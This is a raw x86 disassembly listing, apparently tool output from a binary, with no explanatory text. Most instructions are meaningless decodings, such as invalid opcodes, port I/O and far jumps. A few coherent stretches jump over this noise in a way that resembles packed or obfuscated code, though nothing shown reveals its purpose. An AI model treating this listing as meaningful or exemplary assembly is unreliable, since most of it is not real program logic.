  4043d5:	sub    DWORD PTR [ebx],0xa7d695e6
  4043db:	(bad)  
  4043dc:	lea    ebp,[di+0x4a]
  4043e0:	xchg   edx,eax
  4043e1:	sub    eax,DWORD PTR [esi-0x2b]
  4043e4:	nop
  4043e5:	push   0xffffffa3
  4043e7:	fsubp  st(0),st
  4043e9:	loop   0x404461
  4043eb:	jecxz  0x4043c8
  4043ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043ee:	icebp  
  4043ef:	test   DWORD PTR [edi-0x5],esi
  4043f2:	push   ebp
  4043f3:	out    dx,eax
  4043f4:	in     eax,dx
  4043f5:	test   al,0xba
  4043f7:	nop
  4043f8:	adc    DWORD PTR [ebx-0x29],ecx
  4043fb:	in     eax,0xf3
  4043fd:	es out dx,eax
  4043ff:	xor    esi,ebx
  404401:	sbb    bl,ah
  404403:	push   es
  404404:	lea    ebp,[esi]
  404406:	pushf  
  404407:	mov    eax,0xa1eb3ee5
  40440c:	jle    0x404429
  40440e:	inc    edi
  40440f:	sub    DWORD PTR [esi+0x34],0xfdd3a5fb
  404416:	(bad)
  404419:	pop    eax
  40441a:	add    ebp,DWORD PTR ds:0x5b255562
  404420:	or     DWORD PTR [edi+0x1977650f],edx
  404426:	xchg   esp,esp
  404428:	pusha  
  404429:	nop
  40442a:	xchg   edi,eax
  40442b:	jns    0x404493
  40442d:	cmp    al,0x18
  40442f:	xchg   ebx,eax
  404430:	aad    0x2f
  404432:	push   ss
  404433:	(bad)  
  404435:	cmp    al,0xca
  404437:	jp     0x40442e
  404439:	outs   dx,BYTE PTR ds:[esi]
  40443a:	out    dx,eax
  40443b:	pop    eax
  40443c:	stc    
  40443d:	inc    ebp
  40443e:	mov    esi,0x87856eb
  404443:	in     al,dx
  404444:	jp     0x4043f5
  404446:	out    0xad,eax
  404448:	mov    bl,0x7f
  40444a:	outs   dx,DWORD PTR ds:[esi]
  40444b:	jmp    0x33133742
  404450:	fwait
  404451:	mov    ds:0x3b3d3ce4,al
  404456:	sar    BYTE PTR [ecx-0x6d],1
  404459:	push   edi
  40445a:	push   ebx
  40445b:	adc    eax,0x85c7ab3b
  404460:	xor    eax,0x6df841af
  404465:	or     ebp,esp
  404467:	inc    edi
  404468:	push   ds
  404469:	and    ecx,ecx
  40446b:	inc    esi
  40446c:	jp     0x4044c2
  40446e:	into   
  40446f:	(bad)  
  404471:	dec    esi
  404472:	mov    ebp,0x7c203246
  404477:	mov    dh,0x21
  404479:	jge    0x4044c3
  40447b:	ins    DWORD PTR es:[edi],dx
  40447c:	inc    eax
  40447d:	dec    edx
  40447e:	rol    BYTE PTR [ebx-0x149db79d],0xb5
  404485:	sahf   
  404486:	cmp    DWORD PTR [ecx+ebx*1+0x38],ebx
  40448a:	mov    bh,0xf6
  40448c:	adc    bl,BYTE PTR [eax]
  40448e:	inc    ecx
  40448f:	push   esp
  404490:	into   
  404491:	stc    
  404492:	mov    ecx,0x39605e19
  404497:	add    al,0xcc
  404499:	arpl   WORD PTR [esi-0x2bdf098b],ax
  40449f:	scas   eax,DWORD PTR es:[edi]
  4044a0:	call   0xc11d:0xd83ee6ef
  4044a7:	pop    esi
  4044a8:	pop    esi
  4044a9:	stc    
  4044aa:	ins    DWORD PTR es:[edi],dx
  4044ab:	shl    esi,1
  4044ad:	(bad)  
  4044ae:	pop    ss
  4044af:	add    BYTE PTR [eax],al
  4044b1:	add    bh,BYTE PTR ds:0x94b120
  4044b7:	mov    esp,0x51be4538
  4044bc:	cs (bad) 
  4044be:	lods   al,BYTE PTR ds:[esi]
  4044bf:	rcr    DWORD PTR ds:0xd791ec9c,cl
  4044c5:	retf   
  4044c6:	dec    ecx
  4044c7:	and    DWORD PTR [ebp-0x17],0xd4da6161
  4044ce:	aaa    
  4044cf:	push   esp
  4044d0:	adc    eax,0xf024bbd4
  4044d5:	add    al,0x6d
  4044d7:	stc    
  4044d8:	mov    dh,0x65
  4044da:	rcl    ebp,1
  4044dc:	shr    DWORD PTR [ecx],1
  4044de:	mov    dl,0xe6
  4044e0:	pop    eax
  4044e1:	and    BYTE PTR [eax],0x1c
  4044e4:	jbe    0x40446c
  4044e6:	and    al,0x3e
  4044e8:	iret   
  4044e9:	out    dx,eax
  4044ea:	mov    ch,0xbc
  4044ec:	jno    0x404553
  4044ee:	test   DWORD PTR [ebx],esp
  4044f0:	mov    dl,0xcd
  4044f2:	jge    0x40452b
  4044f4:	mov    ebp,ecx
  4044f6:	int    0x2f
  4044f8:	or     ebp,edi
  4044fa:	add    BYTE PTR [ebx+esi*4-0x5c],ch
  4044fe:	xchg   esp,esi
  404500:	pusha  
  404501:	shl    DWORD PTR [ebx],cl
  404503:	repz inc eax
  404505:	shl    BYTE PTR [eax-0x64d4fc8b],0xdf
  40450c:	inc    ecx
  40450d:	mov    edx,esp
  40450f:	pop    edi
  404510:	fbstp  TBYTE PTR [ebp+0x50]
  404513:	fistp  DWORD PTR [eax]
  404515:	mov    ?,WORD PTR [eax+0x775498fd]
  40451b:	adc    edx,DWORD PTR [eax]
  40451d:	jnp    0x40451d
  40451f:	retf   
  404520:	in     eax,0x7c
  404522:	not    cl
  404524:	xchg   BYTE PTR [edx+0x4c],dl
  404527:	push   esi
  404528:	jb     0x404592
  40452a:	ins    BYTE PTR es:[edi],dx
  40452b:	sbb    ch,BYTE PTR [edx]
  40452d:	xchg   BYTE PTR [ebx],cl
  40452f:	fnstcw WORD PTR [esp+ecx*1+0x0]
  404533:	fdivr  st(1),st
  404535:	mov    edi,0x11f705a8
  40453a:	imul   edi,DWORD PTR ss:[esi],0x662cad99
  404541:	push   ecx
  404542:	push   esp
  404543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404544:	fst    st(2)
  404546:	ja     0x4044ec
  404548:	xchg   esi,eax
  404549:	in     al,dx
  40454a:	and    bh,ch
  40454c:	add    eax,0x3b8a2cb1
  404551:	leave  
  404552:	out    0xf3,eax
  404554:	inc    edx
  404555:	ds iret 
  404557:	arpl   WORD PTR [ebp-0x43],bx
  40455a:	push   ebx
  40455b:	sub    eax,0x4997e090
  404560:	retf   0xdf66
  404563:	push   edx
  404564:	cwde   
  404565:	loopne 0x4045b4
  404567:	and    bh,bh
  404569:	test   al,0x5e
  40456b:	pop    ss
  40456c:	xor    eax,0x5e017690
  404571:	jmp    0xcafd:0xa97e2d95
  404578:	mov    al,0x5a
  40457a:	add    DWORD PTR [esi-0x3e],esi
  40457d:	mov    BYTE PTR [eax+0x416dbb06],ch
  404583:	or     bl,BYTE PTR [edx-0x5edcac0]
  404589:	icebp  
  40458a:	add    DWORD PTR fs:[ebx-0x78],eax
  40458e:	stc    
  40458f:	sub    DWORD PTR [ecx-0x20],edi
  404592:	pushf  
  404593:	xor    eax,0x6556898b
  404598:	in     al,dx
  404599:	adc    DWORD PTR [ebp-0x297d291],ebp
  40459f:	jp     0x404578
  4045a1:	adc    edx,DWORD PTR [edx]
  4045a3:	iret   
  4045a4:	jl     0x404532
  4045a6:	(bad)  
  4045a7:	mov    ah,0xe2
  4045a9:	loop   0x4045e0
  4045ab:	cmp    al,0xc2
  4045ad:	(bad)  [edi+esi*1]
  4045b0:	or     BYTE PTR [ebx-0x32],bh
  4045b3:	push   cs
  4045b4:	and    al,0xf8
  4045b6:	loope  0x404563
  4045b8:	sub    ch,BYTE PTR [ecx]
  4045ba:	adc    BYTE PTR [edi],ch
  4045bc:	xchg   edi,eax
  4045bd:	rcl    BYTE PTR [ebx+0x6],cl
  4045c0:	xor    eax,0x863a1395
  4045c5:	enter  0x22f7,0xaf
  4045c9:	sbb    ebx,0x2f
  4045cc:	cmp    cl,0x8f
  4045cf:	dec    ebp
  4045d0:	and    cl,ah
  4045d2:	lods   eax,DWORD PTR ds:[esi]
  4045d3:	dec    edi
  4045d4:	(bad)  
  4045d5:	out    0x8d,al
  4045d7:	mov    edx,0xdc85aaf0
  4045dc:	dec    eax
  4045dd:	jle    0x40464a
  4045df:	sub    BYTE PTR [esi+0x58c858dc],bl
  4045e5:	pop    ds
  4045e6:	(bad)  
  4045e7:	test   al,0x7
  4045e9:	cwde   
  4045ea:	mov    al,ds:0xb0eb8762
  4045ef:	nop
  4045f0:	xor    DWORD PTR [ebp+0x7cfe4875],edi
  4045f6:	test   eax,0x84ec5e14
  4045fb:	into   
  4045fc:	shl    BYTE PTR [esi],cl
  4045fe:	add    esp,DWORD PTR [edi+eiz*1+0x14]
  404602:	call   0x9fbf292d
  404607:	out    0xb0,al
  404609:	cld    
  40460a:	shl    BYTE PTR [eax+eax*2],0x9b
  40460e:	test   al,0xab
  404610:	fisttp DWORD PTR [ecx+0x62]
  404613:	push   ss
  404614:	mov    al,0xc9
  404616:	add    al,0xf
  404618:	push   cs
  404619:	jl     0x40459f
  40461b:	and    al,0x9f
  40461d:	(bad)  
  40461e:	jbe    0x4045b3
  404620:	adc    BYTE PTR [ebx+0x1e],dl
  404623:	mov    edx,0x1383772f
  404628:	out    0x5b,eax
  40462a:	mov    ds:0x994bf3e8,eax
  40462f:	leave  
  404630:	sub    DWORD PTR [eax],0xc471130d
  404636:	dec    esp
  404637:	and    al,0xd3
  404639:	mov    ecx,0x4e201f09
  40463e:	sbb    ebp,DWORD PTR [edx-0x5c9b43f6]
  404644:	xchg   BYTE PTR [ebx-0x34c368d5],ah
  40464a:	scas   eax,DWORD PTR es:[edi]
  40464b:	pushf  
  40464c:	je     0x40467e
  40464e:	imul   edx,DWORD PTR [ebp-0x8],0xfffffff6
  404652:	sti    
  404653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404654:	xor    DWORD PTR [edx-0x5b],0xd933b3b2
  40465b:	sbb    eax,DWORD PTR [ecx-0x2311615a]
  404661:	mov    ds:0xd9e87a9b,al
  404666:	mov    al,0x15
  404668:	shr    BYTE PTR [ecx],1
  40466a:	std    
  40466b:	test   edi,0xc4bbbb01
  404671:	and    ch,BYTE PTR [eax]
  404673:	jbe    0x404601
  404675:	xlat   BYTE PTR ds:[ebx]
  404676:	or     ch,BYTE PTR [edx-0x1d]
  404679:	cmp    eax,0xf48d702a
  40467e:	retf   
  40467f:	ret    0x610d
  404682:	jns    0x40467c
  404684:	jle    0x40463b
  404686:	stos   BYTE PTR es:[edi],al
  404687:	push   eax
  404688:	add    ecx,DWORD PTR [ecx]
  40468a:	pushf  
  40468b:	rcl    DWORD PTR [edi+0x1ca2131b],1
  404691:	out    dx,al
  404692:	fcmovb st,st(0)
  404694:	sahf   
  404695:	shld   DWORD PTR [edx+0x6a],esi,0xdb
  40469a:	inc    esp
  40469b:	(bad)  
  40469c:	xchg   ecx,eax
  40469d:	frstor [ebx+edi*8+0x3b1260a6]
  4046a4:	ficom  DWORD PTR [esp+ecx*4-0x633193ec]
  4046ab:	test   ebp,edi
  4046ad:	inc    ecx
  4046ae:	mov    edx,0x23d07bca
  4046b3:	lock cmovnp ecx,DWORD PTR [edx-0x36]
  4046b8:	ins    BYTE PTR es:[edi],dx
  4046b9:	inc    ebx
  4046ba:	icebp  
  4046bb:	mov    ah,BYTE PTR [ecx]
  4046bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046be:	aas    
  4046bf:	mov    ebx,0xb91a3a0e
  4046c4:	or     edi,eax
  4046c6:	sub    esp,DWORD PTR [edi-0x6dde1afd]
  4046cc:	imul   esi,DWORD PTR [esi-0x2ad97c2f],0xffffffc4
  4046d3:	scas   eax,DWORD PTR es:[edi]
  4046d4:	jge    0x404668
  4046d6:	out    dx,eax
  4046d7:	mov    ebp,0x1f113194
  4046dc:	inc    edi
  4046dd:	sbb    dh,dh
  4046df:	lods   eax,DWORD PTR ds:[esi]
  4046e0:	pusha  
  4046e1:	mov    ch,0xb8
  4046e3:	stos   DWORD PTR es:[edi],eax
  4046e4:	cmp    dl,BYTE PTR [ebp-0x40]
  4046e7:	cs inc edx
  4046e9:	or     ebp,esi
  4046eb:	lea    ebp,[ecx+0x1f]
  4046ee:	add    ah,al
  4046f0:	mov    al,ds:0x9a595e7f
  4046f5:	inc    esi
  4046f6:	aas    
  4046f7:	pop    ecx
  4046f8:	ins    BYTE PTR es:[edi],dx
  4046f9:	sbb    edx,DWORD PTR [ebp+0x77]
  4046fc:	mov    ebx,0x87ebe070
  404701:	inc    esp
  404702:	cmp    BYTE PTR [edx-0xf],0x5d
  404706:	sbb    DWORD PTR [ecx-0x557ef46f],0xc
  40470d:	dec    esi
  40470e:	add    edi,DWORD PTR [ecx-0x331ed048]
  404714:	por    mm7,QWORD PTR [ebx+edi*8]
  404718:	mov    cl,0x81
  40471a:	dec    ecx
  40471b:	mov    edi,DWORD PTR [ecx+0x4f21cf72]
  404721:	mov    ecx,0xe7267c12
  404726:	mov    DWORD PTR [ebp-0x78c7127d],esp
  40472c:	gs icebp 
  40472e:	shl    BYTE PTR [edx-0x189f30d1],0xed
  404735:	xor    eax,0xc4f6b479
  40473a:	fwait
  40473b:	mov    ch,0xf
  40473d:	lods   al,BYTE PTR ds:[esi]
  40473e:	rol    DWORD PTR [edx],1
  404740:	or     DWORD PTR ds:0x428273,0x42822f
  40474a:	shr    edx,0x2
  40474d:	mov    edx,DWORD PTR ds:0x42824f
  404753:	or     DWORD PTR ds:0x42834f,edx
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0xaae7973e
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    cl,ch
  40477a:	out    0x53,al
  40477c:	sub    DWORD PTR [esi],edi
  40477e:	mov    DWORD PTR [ebp+0x498d367e],edi
  404784:	and    DWORD PTR [esp+eiz*4+0x5bca122f],esp
  40478b:	ss daa 
  40478d:	push   esp
  40478e:	push   0x74
  404790:	call   0x627c7a3
  404795:	inc    ebx
  404796:	(bad)  
  404797:	aam    0xa1
  404799:	and    eax,esp
  40479b:	xchg   edi,eax
  40479c:	xchg   edi,eax
  40479d:	pop    ebx
  40479e:	mov    ds:0xb3e2c9d,al
  4047a3:	sub    eax,DWORD PTR [ebp-0x632fd423]
  4047a9:	or     eax,0x1975825
  4047ae:	xor    ah,bh
  4047b0:	ins    BYTE PTR es:[edi],dx
  4047b1:	push   edi
  4047b2:	mov    ch,0x42
  4047b4:	cmp    ch,al
  4047b6:	test   al,0x56
  4047b8:	stos   BYTE PTR es:[edi],al
  4047b9:	push   ecx
  4047ba:	bound  edx,QWORD PTR [esi-0x7e]
  4047bd:	adc    eax,0x963377b1
  4047c2:	jle    0x4047dd
  4047c4:	mov    al,ds:0xde6679a7
  4047c9:	inc    eax
  4047ca:	das    
  4047cb:	addr16 inc esp
  4047cd:	loope  0x4047ae
  4047cf:	or     BYTE PTR [edi-0x28],ah
  4047d2:	jge    0x404786
  4047d4:	scas   eax,DWORD PTR es:[edi]
  4047d5:	and    DWORD PTR [eax],edi
  4047d7:	sbb    eax,0xd245b23
  4047dc:	push   ebp
  4047dd:	mov    esi,0xa59f7c6
  4047e2:	mov    gs,WORD PTR [edx-0x25]
  4047e5:	dec    eax
  4047e6:	mov    ds:0x9e214dcf,eax
  4047eb:	int3   
  4047ec:	mov    ebx,0x40a87cd2
  4047f1:	jb     0x404786
  4047f3:	inc    eax
  4047f4:	or     DWORD PTR [edi-0x1c9ac8b3],ebp
  4047fa:	cmc    
  4047fb:	(bad)  
  4047fc:	jp     0x4047f8
  4047fe:	stos   BYTE PTR es:[edi],al
  4047ff:	(bad)  
  404800:	cs push es
  404802:	inc    ecx
  404803:	pop    ecx
  404804:	dec    esi
  404805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404806:	into   
  404807:	mov    dl,BYTE PTR [esi]
  404809:	repz (bad) 
  40480b:	and    DWORD PTR [edx+0x772af533],edi
  404811:	(bad)  
  404813:	addr16 push ss
  404815:	push   esi
  404816:	icebp  
  404817:	and    al,0x7d
  404819:	xchg   esp,eax
  40481a:	add    eax,0xe15b61af
  40481f:	jmp    0x404803
  404821:	adc    al,0x6b
  404823:	mov    edx,0xe055ff03
  404828:	adc    esi,DWORD PTR [ebx-0x27e3f7b5]
  40482e:	push   ecx
  40482f:	adc    ecx,edi
  404831:	sbb    eax,0xe57fd013
  404836:	mov    eax,ds:0x5f2c9a5f
  40483b:	daa    
  40483c:	mov    ah,0x40
  40483e:	imul   edx,DWORD PTR [ecx+0x497b8c2b],0x37edfcd0
  404848:	sbb    DWORD PTR [ebp-0x78],ebx
  40484b:	xchg   esp,eax
  40484c:	mov    ah,0x1e
  40484e:	(bad)  
  40484f:	xchg   esp,eax
  404850:	stos   DWORD PTR es:[edi],eax
  404851:	aad    0xe3
  404853:	repnz xor esp,ecx
  404856:	loopne 0x4048a8
  404858:	and    BYTE PTR [esi+0x3e],0x8
  40485c:	dec    ebx
  40485d:	jno    0x40482d
  40485f:	cwde   
  404860:	retf   
  404861:	nop
  404862:	ja     0x404877
  404864:	dec    ebx
  404865:	push   es
  404866:	call   0x9a9af9f0
  40486b:	or     dl,bh
  40486d:	imul   edx,DWORD PTR [edi+0x2e444ee5],0x748fdfae
  404877:	out    dx,al
  404878:	inc    edi
  404879:	or     DWORD PTR [ecx],0xffffffa7
  40487c:	popf   
  40487d:	popf   
  40487e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40487f:	push   ds
  404880:	inc    edi
  404881:	ja     0x4048df
  404883:	sub    ebx,esi
  404885:	and    BYTE PTR [ecx+eiz*8+0x5994450f],bl
  40488c:	add    BYTE PTR [edx+edx*1+0x5b],dh
  404890:	xchg   ebx,eax
  404891:	outs   dx,DWORD PTR ds:[esi]
  404892:	adc    al,0xf0
  404894:	jae    0x4048c0
  404896:	enter  0x8b22,0xd4
  40489a:	mov    al,ds:0x367261b0
  40489f:	fisub  WORD PTR ss:[esi+0x7adc63fb]
  4048a6:	and    al,0x54
  4048a8:	ror    DWORD PTR [edi-0x1fc0135d],cl
  4048ae:	pop    ebx
  4048af:	push   edi
  4048b0:	dec    edi
  4048b1:	repnz push esi
  4048b3:	mov    esp,esi
  4048b5:	(bad)  
  4048b6:	and    DWORD PTR [ebx+ecx*8+0xde741f9],esi
  4048bd:	ds pop eax
  4048bf:	(bad)  
  4048c0:	cli    
  4048c1:	inc    ebx
  4048c2:	adc    DWORD PTR [ebp-0x2e2c92d],esi
  4048c8:	and    DWORD PTR [edx-0x1d7498a9],0x1850ae76
  4048d2:	rol    DWORD PTR [eax+0x4f91ce28],cl
  4048d8:	and    eax,0x59e58ffa
  4048dd:	cmp    ebp,DWORD PTR [esi+0x2b]
  4048e0:	(bad)  
  4048e1:	lds    edx,FWORD PTR [eax]
  4048e3:	mov    ah,BYTE PTR [ecx+0x723b643e]
  4048e9:	ds mov eax,0x6d40bca6
  4048ef:	lods   al,BYTE PTR ds:[esi]
  4048f0:	(bad)  [edi-0x5c34df6a]
  4048f6:	ror    bl,1
  4048f8:	repz add esp,DWORD PTR [ebx+0x6c]
  4048fc:	outs   dx,BYTE PTR ds:[esi]
  4048fd:	adc    DWORD PTR [esi-0x231d1331],0x3b829404
  404907:	retf   
  404908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404909:	sbb    esp,DWORD PTR [ebp-0x402c44f8]
  40490f:	jmp    0x8268:0x8b06463a
  404916:	xor    eax,DWORD PTR [ebp+0x49]
  404919:	adc    eax,0x43c1505e
  40491e:	cmc    
  40491f:	ins    BYTE PTR es:[edi],dx
  404920:	ins    DWORD PTR es:[edi],dx
  404921:	mov    cl,0xb8
  404923:	(bad)  
  404924:	jae    0x40494e
  404926:	call   0x978359c4
  40492b:	jge    0x404979
  40492d:	loop   0x4048ca
  40492f:	and    DWORD PTR [ecx-0x2b1c8fc3],0x28c14481
  404939:	inc    eax
  40493a:	mov    edx,0x232ea255
  40493f:	imul   dl
  404941:	xor    ah,BYTE PTR [ebp-0x2ca30177]
  404947:	xor    eax,0x8b3eab00
  40494c:	imul   ecx,DWORD PTR ds:0xab1c3114,0xffffffb7
  404953:	xchg   edx,eax
  404954:	lock stos DWORD PTR es:[edi],eax
  404956:	lds    edx,FWORD PTR ds:0x48c8ef59
  40495c:	push   edx
  40495d:	enter  0x270,0x85
  404961:	xchg   ebx,eax
  404962:	test   ebp,edi
  404964:	push   ebx
  404965:	loope  0x40491b
  404967:	jmp    DWORD PTR [ebx]
  404969:	pop    es
  40496a:	or     edx,edi
  40496c:	sub    dh,BYTE PTR [esi-0x7e]
  40496f:	out    0x1b,al
  404971:	js     0x404902
  404973:	inc    edi
  404974:	cmp    al,0x8e
  404976:	test   BYTE PTR [edx],0xf1
  404979:	mov    ah,0x35
  40497b:	or     eax,0x390ae17a
  404980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404981:	fmul   QWORD PTR [eax+0x2f735b9a]
  404987:	aaa    
  404988:	fnsave [edi-0x5608d917]
  40498e:	mov    esi,edi
  404990:	lods   al,BYTE PTR ds:[esi]
  404991:	dec    ecx
  404992:	outs   dx,BYTE PTR ds:[esi]
  404993:	sar    DWORD PTR [ebx-0x6f],0x13
  404997:	mov    eax,0x3672994d
  40499c:	rcl    BYTE PTR [ebx],0x44
  40499f:	nop
  4049a0:	or     dl,BYTE PTR [edi+eax*4+0x4af10edd]
  4049a7:	(bad)  
  4049a8:	ret    
  4049a9:	ds ins DWORD PTR es:[edi],dx
  4049ab:	jae    0x404a15
  4049ad:	cld    
  4049ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049af:	and    BYTE PTR [ecx-0x1e19d7b4],dh
  4049b5:	sbb    esp,DWORD PTR [ebp+0x7ef5f139]
  4049bb:	jmp    0x4049f8
  4049bd:	jmp    0x404981
  4049bf:	js     0x404989
  4049c1:	mov    ch,0x6f
  4049c3:	lock mov al,BYTE PTR [ebp-0x57]
  4049c7:	sbb    DWORD PTR [edx+0x59c4c1cb],edi
  4049cd:	xchg   esi,eax
  4049ce:	inc    ebx
  4049cf:	(bad)  
  4049d0:	push   esp
  4049d1:	std    
  4049d2:	inc    ecx
  4049d3:	mov    BYTE PTR [edi+0x92dc1db],dh
  4049d9:	add    al,0x4
  4049db:	jnp    0x404a06
  4049dd:	and    al,dh
  4049df:	mov    WORD PTR [esi-0x60],?
  4049e2:	mov    esp,0xe051cff7
  4049e7:	sbb    eax,0xc5eaa80e
  4049ec:	sbb    dh,BYTE PTR [edi-0x12]
  4049ef:	mov    bh,0x8a
  4049f1:	xchg   edi,eax
  4049f2:	push   esp
  4049f3:	jl     0x4049d1
  4049f5:	mov    ah,0xe
  4049f7:	sbb    al,BYTE PTR [esi+0x71ef347d]
  4049fd:	xor    BYTE PTR [esp+ebp*4+0x2],0x5f
  404a02:	clc    
  404a03:	icebp  
  404a04:	arpl   ax,ax
  404a06:	push   ebp
  404a07:	popa   
  404a08:	bound  edx,QWORD PTR [edi+eiz*2-0x6f9c1b67]
  404a0f:	xchg   esp,eax
  404a10:	xor    eax,edi
  404a12:	out    dx,al
  404a13:	or     eax,0xd7a05fb0
  404a18:	stos   DWORD PTR es:[edi],eax
  404a19:	sub    DWORD PTR [edi-0x444ea78],edx
  404a1f:	outs   dx,DWORD PTR ds:[esi]
  404a20:	push   ebx
  404a21:	jp     0x404a4f
  404a23:	outs   dx,DWORD PTR ds:[esi]
  404a24:	mov    DWORD PTR [edx],ecx
  404a26:	ss repnz mov dh,0x1a
  404a2a:	mov    edx,0x8a39811d
  404a2f:	dec    eax
  404a30:	and    eax,0xc53f99b7
  404a35:	fcom   st(2)
  404a37:	xchg   edx,eax
  404a38:	lds    edx,FWORD PTR [ecx-0x68]
  404a3b:	adc    esp,DWORD PTR [edx]
  404a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a3e:	(bad)  
  404a3f:	push   ss
  404a40:	out    0xbe,eax
  404a42:	inc    edx
  404a43:	or     al,0x60
  404a45:	lock (bad) 
  404a47:	jo     0x4049e3
  404a49:	add    ebx,DWORD PTR [edx]
  404a4b:	cli    
  404a4c:	push   ebp
  404a4d:	retf   0x4a85
  404a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a51:	dec    esi
  404a52:	not    ebp
  404a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a56:	jmp    0x404a10
  404a58:	sti    
  404a59:	push   ecx
  404a5a:	dec    esi
  404a5b:	test   DWORD PTR [ebx+0x3f],ecx
  404a5e:	mov    bh,0x4e
  404a60:	lods   al,BYTE PTR ds:[esi]
  404a61:	mov    DWORD PTR [esi+0x19],edi
  404a64:	ror    bh,0x4b
  404a67:	pusha  
  404a68:	jmp    0xeb93:0xff4475c9
  404a6f:	push   ds
  404a70:	pop    ss
  404a71:	and    edx,DWORD PTR [ecx+0x371cb4be]
  404a77:	and    al,0x2b
  404a79:	dec    esp
  404a7a:	popf   
  404a7b:	ret    0x6e6
  404a7e:	jmp    0x404a09
  404a80:	dec    edx
  404a81:	jp     0x404a28
  404a83:	or     DWORD PTR [ebx-0x1a],eax
  404a86:	pop    ds
  404a87:	inc    esp
  404a88:	fstp   QWORD PTR [esi+0x67d74173]
  404a8e:	sub    BYTE PTR [edx-0x36a674c0],ch
  404a94:	push   eax
  404a95:	jge    0x404a8c
  404a97:	jecxz  0x404a5f
  404a99:	xchg   DWORD PTR [esi],ecx
  404a9b:	iret   
  404a9c:	xchg   ecx,ebp
  404a9e:	in     eax,dx
  404a9f:	js     0x404b0a
  404aa1:	fild   QWORD PTR [ebx+0x67]
  404aa4:	jns    0x404ae0
  404aa6:	xchg   ebx,eax
  404aa7:	not    DWORD PTR [ebp+0x5438c70e]
  404aad:	mov    dl,0xe4
  404aaf:	cmp    eax,0x49a7d33
  404ab4:	call   0xbe28:0x2380e1de
  404abb:	xor    DWORD PTR [edi-0x2f870751],eax
  404ac1:	push   ss
  404ac2:	mov    ss,WORD PTR [ebp+0x4d4f6e82]
  404ac8:	and    al,0x34
  404aca:	popa   
  404acb:	loop   0x404a5f
  404acd:	sbb    bl,BYTE PTR [edx-0x7ff98c7a]
  404ad3:	gs lahf 
  404ad5:	icebp  
  404ad6:	daa    
  404ad7:	lods   eax,DWORD PTR ds:[esi]
  404ad8:	repnz neg DWORD PTR [ecx]
  404adb:	(bad)  
  404adc:	pop    esi
  404add:	ja     0x404ac2
  404adf:	into   
  404ae0:	pushf  
  404ae1:	pop    ecx
  404ae2:	ficom  DWORD PTR [ebx-0x1c7699a1]
  404ae8:	cmp    al,0xa1
  404aea:	nop
  404aeb:	pop    esi
  404aec:	xchg   esp,eax
  404aed:	imul   edi,DWORD PTR [ebx-0x4f069b85],0xffffffca
  404af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404af5:	ficomp DWORD PTR [esi-0x52]
  404af8:	add    edx,DWORD PTR [ebx-0x411b212b]
  404afe:	adc    al,0xdd
  404b00:	iret   
  404b01:	int    0xe5
  404b03:	jb     0x404afe
  404b05:	jnp    0x404ab1
  404b07:	add    ah,ch
  404b09:	sub    bh,BYTE PTR [ebx-0x3c]
  404b0c:	fwait
  404b0d:	mov    ch,0x57
  404b0f:	add    eax,DWORD PTR [ebp-0x9]
  404b12:	and    ch,BYTE PTR ds:0x10a0b274
  404b18:	fstp   TBYTE PTR [ebp+ebp*1+0x25]
  404b1c:	xchg   DWORD PTR [edi-0x10],edi
  404b1f:	inc    ecx
  404b20:	sub    eax,0x6cbbcdef
  404b25:	push   edx
  404b26:	out    0x59,eax
  404b28:	pop    esi
  404b29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b2a:	xchg   DWORD PTR [esi-0x4ba3b33a],esi
  404b30:	xchg   edx,eax
  404b31:	pusha  
  404b32:	int3   
  404b33:	or     DWORD PTR [si-0x268e],esp
  404b38:	lods   eax,DWORD PTR ds:[esi]
  404b39:	iret   
  404b3a:	mov    ecx,DWORD PTR [ebx]
  404b3c:	mov    edx,DWORD PTR [ebx+0x4]
  404b3f:	xor    DWORD PTR [ebp-0x1c],edi
  404b42:	add    DWORD PTR ds:0x428263,0x4282d7
  404b4c:	xor    edx,edx
  404b4e:	jmp    0x404f2c
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	fwait
  404b60:	dec    edx
  404b61:	push   ss
  404b62:	stos   BYTE PTR es:[edi],al
  404b63:	pusha  
  404b64:	rcr    DWORD PTR [eax],0x18
  404b67:	sahf   
  404b68:	adc    bl,BYTE PTR [eax]
  404b6a:	sbb    BYTE PTR [ecx+0x14],bh
  404b6d:	push   ss
  404b6e:	sub    DWORD PTR [esi+ecx*8-0x78],esp
  404b72:	mov    fs,WORD PTR [eax+0x54]
  404b75:	push   ebx
  404b76:	add    al,0x93
  404b78:	inc    edx
  404b79:	rcr    dh,0xcd
  404b7c:	mov    ds:0x7b86be5c,eax
  404b81:	and    DWORD PTR [esi-0x42],ebx
  404b84:	sub    al,0xb6
  404b86:	repz and BYTE PTR [ebp-0x22],ah
  404b8a:	mov    bl,0x6b
  404b8c:	enter  0xe75e,0x17
  404b90:	xchg   esp,eax
  404b91:	nop
  404b92:	cmp    al,BYTE PTR [eax-0x2446482]
  404b98:	jecxz  0x404b57
